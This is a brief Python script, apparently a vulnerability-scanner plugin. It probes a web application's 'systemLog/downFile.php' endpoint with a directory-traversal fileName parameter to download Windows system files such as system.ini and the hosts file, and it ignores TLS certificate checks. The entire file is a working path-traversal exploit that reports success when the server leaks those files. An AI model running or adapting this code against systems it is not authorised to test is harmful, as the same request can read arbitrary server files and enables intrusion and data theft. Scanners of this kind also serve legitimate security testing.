import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	target_url3 = baseurl + 'systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini'
	target_url4 = baseurl + 'systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../Windows/System32/drivers/etc/hosts'
	r3=requests.get(target_url3,timeout=5,verify=False)
	r4=requests.get(target_url4,timeout=5,verify=False)
	if '[drivers]' in r3.text or ('127.0.0.1' in r4.text and 'For example' in r4.text):
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
